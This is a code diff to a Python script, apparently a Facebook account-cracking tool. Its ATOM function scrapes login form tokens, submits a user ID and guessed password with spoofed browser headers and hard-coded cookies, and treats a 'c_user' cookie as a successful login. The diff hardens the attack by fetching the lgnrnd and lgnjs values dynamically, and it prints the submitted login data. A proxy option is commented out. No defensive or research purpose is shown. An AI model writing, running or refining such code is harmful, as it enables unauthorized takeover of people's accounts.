@@ -122,25 +122,10 @@ def ATOM(uid, pww, total_idz):
             data = {
             'jazoest': re.search('name="jazoest" value="(.*?)"', str(requu1.text)).group(1),
             'lsd': re.search('name="lsd" value="(.*?)"', str(requu1.text)).group(1),
-            'display': '',
-            'isprivate': '',
-            'return_session': '',
-            'skip_api_login': '',
-            'signed_next': '',
-            'trynum': '6',
-            'timezone': '-330',
             'lgndim': 'eyJ3IjoxNDQwLCJoIjo5MDAsImF3IjoxNDQwLCJhaCI6ODYwLCJjIjoyNH0=',
-            'lgnrnd': '050811_rmc8',
-            'lgnjs': '1740229691',
+            'lgnrnd': re.search('name="lgnrnd" value="(.*?)"', str(requu1.text)).group(1),
+            'lgnjs': re.search('name="lgnjs" value="(.*?)"', str(requu1.text)).group(1),
             'email': uid,
-            'prefill_contact_point': '',
-            'prefill_source': 'browser_dropdown',
-            'prefill_type': 'password',
-            'first_prefill_source': 'browser_dropdown',
-            'first_prefill_type': 'password',
-            'had_cp_prefilled': 'false',
-            'had_password_prefilled': 'true',
-            'ab_test_data': '//AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAVA//VV/VVABFAR',
             'encpass': "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], pw),}
             cookies = {
             'datr': 'ES-iZxg35DqKN--TlZlh4Mwu',
@@ -177,7 +162,7 @@ def ATOM(uid, pww, total_idz):
             'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36',
             'viewport-width': '867',}
             response = session.post('https://www.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=120&lwc=1348028',cookies=cookies,headers=headers,data=data,allow_redirects=False) #proxies=proxs)
-            #print(response)
+            print(data)
             log_cookies = session.cookies.get_dict().keys()
             if "c_user" in log_cookies:
                 #kuki = convert(session.cookies.get_dict())
